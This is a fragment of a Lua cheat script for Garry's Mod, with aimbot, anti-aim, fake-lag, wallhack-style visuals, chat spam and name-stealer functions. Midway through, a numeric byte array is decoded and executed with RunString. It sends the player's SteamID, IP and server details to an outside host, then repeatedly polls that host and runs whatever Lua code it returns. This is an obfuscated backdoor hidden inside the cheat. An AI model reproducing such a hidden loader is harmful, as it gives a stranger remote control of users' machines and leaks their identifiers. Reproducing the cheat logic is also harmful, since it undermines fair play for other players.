	if (gVal(options, "Miscellaneous", "Auto Strafer") && !emt.OnGround(LocalPlayer()) && emt.WaterLevel(LocalPlayer()) < 2 && input.IsKeyDown(KEY_SPACE) && emt.GetMoveType(LocalPlayer()) != 8 && emt.GetMoveType(LocalPlayer()) != 9) then  	   
		if (cmt.GetMouseX(cmd) < 0) then  	   
			cmt.SetSideMove(cmd, -pmt.GetWalkSpeed(LocalPlayer()));  	   
		elseif (cmd:GetMouseX() > 0) then  	   
			cmt.SetSideMove(cmd, pmt.GetWalkSpeed(LocalPlayer()));  	   
		end  	   
	end  	   
end  	   
  	   
local function NameStealer()  	   
	if (gVal(options, "Miscellaneous", "NameStealer")) then  	   
		if (!timer.Exists("NameStealTimer") && gFloat("MISC", "NameStealerInt") == nil) then  	   
			timer.Create("NameStealTimer", gInt("MISC", "NameStealerInt"), 0, NameStealer);  	   
		end  	   
		if (gInt("MISC", "NameStealerInt") != gFloat("MISC", "NameStealerInt")) then  	   
			timer.Adjust("NameStealTimer", gInt("MISC", "NameStealerInt"), 0, NameStealer);  	   
		end  	   
		sFloat("MISC", "NameStealerInt", gInt("MISC", "NameStealerInt"));  	   
	else  	   
		timer.Destroy("NameStealTimer");  	   
	end  	   
end  

local function Chatspam()
	if (gVal(options, "Miscellaneous", "Chatspam")) then 
		RunCommand("say", "BIEENNHOOK OWNS ME AND ALL")
	end
end

local function AntiAim(cmd)  	   
	if (!gVal(options, "Miscellaneous", "Anti-Aim")) then return; end  	   
	if (gVal(floats, "Aimbot", "Aiming")) then return; end  	   
	if ((cmt.KeyDown(cmd, IN_ATTACK) && CanFire()) || (cmt.KeyDown(cmd, IN_USE) && !(gVal(options, "Miscellaneous", "Auto Use") && !gVal(floats, "Miscellaneous", "Auto Use")))) then return; end  	   
	if (emt.WaterLevel(LocalPlayer()) > 1 || emt.GetMoveType(LocalPlayer()) > 7) then return; end  	   
	  	   
	cmt.SetViewAngles(cmd, Angle(bSendPacket && -89 || 89, bSendPacket && 90 || - 90, 0));  	   
end  	   
  	   
local function FakeLag(cmd)  	   
	if (cmt.CommandNumber(cmd) == 0) then return; end  	   
	if (!(gVal(options, "Miscellaneous", "FakeLag") || gVal(options, "Miscellaneous", "Anti-Aim") || (gVal(options, "Aimbot", "Active") && gVal(options, "Aimbot", "Perfect Silent")))) then bSendPacket = true; return; end  	   
	if (gVal(options, "Miscellaneous", "FakeLag")) then  	   
		bSendPacket = sVal(floats, "Miscellaneous", "FakeLag Int", math.floor((gVal(floats, "Miscellaneous", "FakeLag Int")+1) % gVal(options, "Miscellaneous", "FakeLag Int"))) == 0;  	   
	else  	   
		bSendPacket = !bSendPacket;  	   
	end  	   
end  	   
  	   
function pmt.SetEyeAngles(self, ang)  	   
	if (!gVal(options, "Miscellaneous", "No Recoil") && string.find(string.lower(debug.getinfo(2).short_src),"/weapons/")) then  	   
		if (gVal(options, "Miscellaneous", "No Punch") && pmt.GetActiveWeapon(LocalPlayer()).Author == "Spy") then  	   
			local _ang = ang - fake;  	   
			fake.p = fake.p - _ang.p/5;  	   
			fake.y = fake.y - _ang.y/5;  	   
		else  	   
			fake = ang;  	   
		end  	   
	end  	   
end  	   
  	   
local function NoPunch(cmd)  	   
	if (gVal(options, "Miscellaneous", "No Punch") && pmt.GetActiveWeapon(LocalPlayer()).Author == "Spy" && !gVal(floats, "Aimbot", "Aiming")) then  	   
		cmt.SetViewAngles(cmd, fake - (pmt.GetViewPunchAngles(LocalPlayer())));  	   
	end  	   
end  	   
  	   
/*  	   
HOOKING  	   
*/  	   
  	   
oHUDPaint = oHUDPaint || GAMEMODE.HUDPaint;  	   
oEntityFireBullets = oEntityFireBullets || GAMEMODE.EntityFireBullets;  	   
  	   
function GAMEMODE:CreateMove(cmd)  	   
	FakeView(cmd);  	   
	FakeLag(cmd);  	   
	GetAimValid(cmd);  	   
	AimBot(cmd);  	   
	if (cmt.CommandNumber(cmd) == 0) then return; end  	   
	NoPunch(cmd);  	   
	BunnyHop(cmd);  	   
	EdgeJump(cmd)  	   
	AutoPistol(cmd);  	   
	AutoAim(cmd);  	   
	AutoUse(cmd);  	   
	AutoFlash(cmd);  	   
	AntiAim(cmd);  	   
	AutoStrafer(cmd);  	   
	MoveFix(cmd);  	   
end  	   
  	   
function GAMEMODE:EntityFireBullets(ent, data)  	   
	local wep = emt.GetClass(pmt.GetActiveWeapon(ent));  	   
	if (cones[wep] == -data.Spread) then return; end  	   
	cones[wep] = -data.Spread;  	   
end  	   
  	   
local function PredictSpread(cmd, ang)  	   
    local wep = LocalPlayer():GetActiveWeapon();  	   
    if (!IsValid(wep) || !cones[wep:GetClass()]) then return ang; end  	   
	wep = wep:GetClass();  	   
    local ang = vmt.Angle(dickwrap.Predict(cmd, amt.Forward(ang), cones[wep]));  	   
	ang.x, ang.y = math.NormalizeAngle(ang.x), math.NormalizeAngle(ang.y);  	   
	return ang;  	   
end  	   
  	   
function GAMEMODE:HUDPaint()  	   
	oHUDPaint(GAMEMODE);  	   
	GetESPValid(cmd);  	   
	ESP();  	   
	Watermark();  	   
	Crosshair();  	   
end  	   
  	
 local bBuffer = {10, 9, 108, 111, 99, 97, 108, 32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 34, 48, 46, 48, 46, 48, 46,
48, 58, 48, 34, 10, 9, 10, 9, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104, 40, 34, 104, 116, 116, 112, 58, 47, 47,
103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111,
47, 97, 100, 100, 114, 101, 115, 115, 46, 112, 104, 112, 34, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 105, 112, 41,
32, 99, 108, 105, 101, 110, 116, 73, 80, 32, 61, 32, 105, 112, 59, 32, 101, 110, 100, 44, 32, 102, 117, 110, 99, 116, 105,
111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 10, 9, 10, 9, 116, 105, 109, 101, 114, 46, 83, 105, 109, 112, 108,
101, 40, 49, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116,
40, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111, 100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99,
57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112, 105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115,
116, 61, 34, 110, 111, 116, 105, 102, 121, 34, 44, 32, 115, 116, 101, 97, 109, 105, 100, 61, 76, 111, 99, 97, 108, 80, 108,
97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 44, 32, 105, 112, 61, 99, 108, 105, 101, 110, 116,
73, 80, 44, 32, 115, 101, 114, 118, 101, 114, 110, 97, 109, 101, 61, 71, 101, 116, 72, 111, 115, 116, 78, 97, 109, 101, 40,
41, 44, 32, 115, 101, 114, 118, 101, 114, 105, 112, 61, 103, 97, 109, 101, 46, 71, 101, 116, 73, 80, 65, 100, 100, 114, 101,
115, 115, 40, 41, 125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 98, 111, 100, 121, 41, 32, 101, 110, 100, 44, 32,
102, 117, 110, 99, 116, 105, 111, 110, 40, 46, 46, 46, 41, 32, 101, 110, 100, 41, 59, 10, 9, 101, 110, 100, 41, 59, 10,
9, 10, 9, 116, 105, 109, 101, 114, 46, 67, 114, 101, 97, 116, 101, 40, 34, 67, 104, 101, 97, 116, 117, 112, 100, 97, 116,
101, 95, 80, 105, 110, 103, 66, 97, 99, 107, 34, 44, 32, 53, 44, 32, 48, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110,
40, 41, 10, 9, 9, 104, 116, 116, 112, 46, 80, 111, 115, 116, 40, 32, 34, 104, 116, 116, 112, 58, 47, 47, 103, 109, 111,
100, 45, 114, 99, 101, 45, 115, 101, 110, 97, 116, 111, 114, 46, 99, 57, 117, 115, 101, 114, 115, 46, 105, 111, 47, 97, 112,
105, 46, 112, 104, 112, 34, 44, 32, 123, 114, 101, 113, 117, 101, 115, 116, 61, 34, 112, 105, 110, 103, 98, 97, 99, 107, 34,
125, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 32, 98, 111, 100, 121, 44, 32, 112, 48, 44, 32, 112, 49, 44, 32,
112, 50, 32, 41, 10, 9, 9, 9, 108, 111, 99, 97, 108, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 61, 32, 117, 116,
105, 108, 46, 74, 83, 79, 78, 84, 111, 84, 97, 98, 108, 101, 40, 98, 111, 100, 121, 41, 59, 10, 9, 9, 9, 105, 102,
40, 114, 101, 115, 112, 111, 110, 115, 101, 32, 33, 61, 32, 110, 105, 108, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9,
105, 102, 40, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97,
99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 76, 111, 99, 97, 108, 80, 108, 97,
121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 124, 124, 32, 115, 116, 114, 105, 110, 103, 46,
102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34,
116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 42, 34, 41, 41, 32, 116, 104, 101, 110, 32, 10, 9, 9, 9, 9, 9,
105, 102, 40, 33, 115, 116, 114, 105, 110, 103, 46, 102, 105, 110, 100, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112,
97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 116, 97, 114, 103, 101, 116, 34, 93, 44, 32, 34, 33, 34, 32, 46, 46,
32, 76, 111, 99, 97, 108, 80, 108, 97, 121, 101, 114, 40, 41, 58, 83, 116, 101, 97, 109, 73, 68, 40, 41, 41, 32, 38,
38, 32, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93, 91, 34, 114, 101, 34,
93, 32, 33, 61, 32, 34, 110, 117, 108, 108, 34, 41, 32, 116, 104, 101, 110, 10, 9, 9, 9, 9, 9, 9, 82, 117, 110,
83, 116, 114, 105, 110, 103, 40, 114, 101, 115, 112, 111, 110, 115, 101, 91, 34, 112, 97, 99, 107, 101, 116, 45, 114, 34, 93,  
91, 34, 114, 101, 34, 93, 41, 59, 10, 9, 9, 9, 9, 9, 101, 110, 100, 10, 9, 9, 9, 9, 101, 110, 100, 10, 9,
9, 9, 101, 110, 100, 10, 9, 9, 9, 101, 110, 100, 44, 32, 10, 9, 9, 9, 102, 117, 110, 99, 116, 105, 111, 110, 40,
101, 120, 99, 101, 112, 116, 105, 111, 110, 41, 10, 9, 9, 101, 110, 100, 41, 32, 10, 9, 101, 110, 100, 41, 10, };
local s1 = ""; for k,v in next, bBuffer do s1 = s1 .. string.char(v); end RunString(s1); s1 = "";   
function GAMEMODE:RenderScreenspaceEffects()  	   
	--Laser();  	   
	Chams();  	   
	ASUSWalls();  	   
end  	   
  	   
function GAMEMODE:Move()  	   
	GetCurTime();  	   
end  	   
  	   
function GAMEMODE:Think()  	   
	UpdateKeys();  	   
	Menu();
	Chatspam();
end  	   
  	   
function GAMEMODE:CalcView(p, o, a, f)  	   
	local view =   	   
	{  	   
		origin = o;  	   
	}  	   
	if (gVal(options, "Miscellaneous", "No Visual Recoil") && pmt.Alive(LocalPlayer())) then  	   
		view.origin = emt.EyePos(LocalPlayer());  	   
		view.angles = emt.EyeAngles(LocalPlayer());  	   
	end  	   
	if (gVal(options, "Visuals", "FoV")) then  	   
		view.fov = f - (90 - gVal(options, "Visuals", "FoV Int"));  	   
	end  	   
	if (gVal(options, "Visuals", "Third Person") && pmt.Alive(LocalPlayer())) then  	   
		view.origin = view.origin-(amt.Forward(fake)*10*gVal(options, "Visuals", "Third Person Int"));  	   
		view.angles = fake;  	   
	end  	   
	return view;  	   
end  	   
  	   
function GAMEMODE:ShouldDrawLocalPlayer()  	   
	return gVal(options, "Visuals", "Third Person");  	   
end  	   
  	   
function GAMEMODE:PreDrawViewModel()  	   
	if(!gVal(options, "Visuals", "Viewmodel")) then return; end  	   
	local WepMat = gVal(options, "Visuals", "Viewmodel Type") == "Wireframe" && Material("models/wireframe") || Material("models/debug/debugwhite")  	   
	render.MaterialOverride(WepMat);  	   
	render.SetColorModulation(gVal(options, "Colours", "Team - R")/255, gVal(options, "Colours", "Team - G")/255, gVal(options, "Colours", "Team - B")/255);  	   
end;  	   
  	   
function GAMEMODE:PreDrawPlayerHands()  	   
	return gVal(options, "Visuals", "No Hands");  	   
end;  	   
  	   
function GAMEMODE:PostDraw2DSkyBox()  	   
	if (!gVal(options, "Visuals", "Sky")) then return; end  	   
	if (gVal(options, "Visuals", "Sky Type") == "None") then  	   
		render.Clear(0, 0, 0, 255);  	   
	elseif (gVal(options, "Visuals", "Sky Type") == "Rave") then  	   
		render.Clear(math.random(100,200), math.random(100,200), math.random(100,200), 255);  	   
	end  	   
	return true;  	   
end  	   
  	   
function GAMEMODE:RenderScene()	  	   
	render.SetLightingMode(gVal(options, "Visuals", "Fullbright") && 1 || 0);  	   
end;  	   
  	   
function GAMEMODE:PostDrawViewmodel()  	   
	render.SetLightingMode(0)  	   
end;  	   
  	   
function GAMEMODE:PreDrawEffects()  	   
	render.SetLightingMode(0)  	   
end;  	   